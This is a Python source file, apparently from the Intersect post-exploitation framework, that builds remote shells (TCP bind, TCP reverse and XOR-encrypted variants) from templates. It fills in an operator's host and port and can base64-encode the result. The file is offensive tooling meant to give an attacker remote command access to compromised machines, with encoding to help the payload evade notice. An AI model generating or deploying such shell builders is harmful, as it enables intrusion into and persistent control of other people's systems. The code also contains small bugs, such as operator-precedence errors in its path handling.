#!/usr/bin/python
# Intersect Framework (c) 2012
# Server-side shell generation
# usage: ./build.py --type=tcpbind --host=192.168.1.4 --port=4444 --name=newshell

import sys, os
import argparse
import shutil
import logging
import base64

Templates = ("src/Templates/remote/")
Scripts = ("Scripts/")
BuildLog = ("Logs/build_log")

logging.basicConfig(filename=BuildLog, level=logging.INFO, format='%(asctime)s %(message)s')

def valid_ip(ip):
    parts = ip.split('.')
    return (
        len(parts) == 4
        and all(part.isdigit() for part in parts)
        and all(0 <= int(part) <= 255 for part in parts)
            )

def main():
    if valid_ip(args.address) is False:
        print("[!] Invalid IPv4 address!")
        sys.exit()
    elif os.path.exists(Scripts+args.name) is True:
        print("[!] Script name all ready exists!")
        sys.exit()
    else:
        if args.type == "tcpbind":
            template = (Templates+"tcpbind.py")
            shutil.copy2(template, Scripts+args.name)
            makeshell = open(Scripts+args.name, "a")
            makeshell.write("\nHOST = '%s'" % args.address)
            makeshell.write("\nPORT = %s" % int(args.port))
            makeshell.write("\nconn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)")
            makeshell.write("\nconn.bind((HOST, PORT))")
            makeshell.write("\nconn.listen(5)")
            makeshell.write("\naccept()")
            os.system("chmod u+x %s" % Scripts+args.name)
            logging.info("TCP bind shell created. %s:%s %s" % (args.address, args.port, args.name))
            print("[*] New shell created!")
            print("    Location: %s" % Scripts+args.name)
        
        elif args.type == "tcprev":
            template = (Templates+"tcprev.py")
            shutil.copy2(template, Scripts+args.name)
            makeshell = open(Scripts+args.name, "a")
            makeshell.write("\n    HOST = '%s'" % args.address)
            makeshell.write("\n    PORT = %s" % int(args.port))
            makeshell.write("\n\nglobalvars()")
            makeshell.write("\nmain()")
            makeshell.close()
            os.system("chmod u+x %s" % Scripts+args.name)
            logging.info("TCP reverse shell created. %s:%s %s" % (args.address, args.port, args.name))
            print("[*] New shell created!")
            print("    Location: %s" % Scripts+args.name)

        elif args.type == "xorbind":
            if args.key is None:
                print("[!] XOR key cannot be left blank!")
                sys.exit()
            else:
                template = (Templates+"xorbind.py")
                shutil.copy2(template, Scripts+args.name)
                makeshell = open(Scripts+args.name, "a")
                makeshell.write("\nHOST = '%s'" % args.address)
                makeshell.write("\nPORT = %s" % int(args.port))
                makeshell.write("\npin = '%s'" % args.key)
                makeshell.write("\nconn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)")
                makeshell.write("\nconn.bind((HOST, PORT))")
                makeshell.write("\nconn.listen(5)")
                makeshell.write("\naccept()")
                makeshell.close()
                os.system("chmod u+x %s" % Scripts+args.name)
                logging.info("TCP XOR bind shell created. %s:%s %s" % (args.address, args.port, args.name))
                print("[*] New shell created!")
                print("    Location: %s" % Scripts+args.name)
                    
        elif args.type == "xorrev":
            if args.key is None:
                print("[!] XOR key cannot be left blank!")
                sys.exit()
            else:
                template = (Templates+"xorrev.py")
                shutil.copy2(template, Scripts+args.name)
                makeshell = open(Scripts+args.name, "a")
                makeshell.write("\n    HOST = '%s'" % args.address)
                makeshell.write("\n    PORT = %s" % int(args.port))
                makeshell.write("\n    pin = '%s'" % args.key)
                makeshell.write("\n\nglobalvars()")
                makeshell.write("\nmain()")
                makeshell.close()
                os.system("chmod u+x %s" % Scripts+args.name)
                logging.info("TCP XOR reverse shell created. %s:%s %s" % (args.address, args.port, args.name))
                print("[*] New shell created!")
                print("    Location: %s" % Scripts+args.name)


help = """Quickly create an Intersect server-side shell.
Specify the shell type, host and port information and a name for your new shell."""

parser = argparse.ArgumentParser(description=help, prog="build")
parser.add_argument('--address', help='IP address for listen or bind shell', required=True)
parser.add_argument('--port', help='Port for listen or bind shell.', required=True, type=int)
parser.add_argument('--type', help='Type of shell.', required=True, choices=["tcpbind", "tcprev", "xorbind", "xorrev"])
parser.add_argument('--name', help='Filename new shell will be saved as.', required=True)
parser.add_argument('--key', help='XOR private key')
parser.add_argument('--b64', help='base64 encode', action='store_true')

args = parser.parse_args()
main()

if args.b64 is True:
    plain = open(Scripts+args.name, "r")
    base = open(Scripts+args.name+"_b64", "w")
    print("[*] Encoding shell with base64...")
    for lines in plain.readlines():
        enc = base64.b64encode(lines)
        base.write(enc)
    print("[*] Encoding complete!")
    print("    Location: %s" % Scripts+args.name+"_b64")
    sys.exit(0)
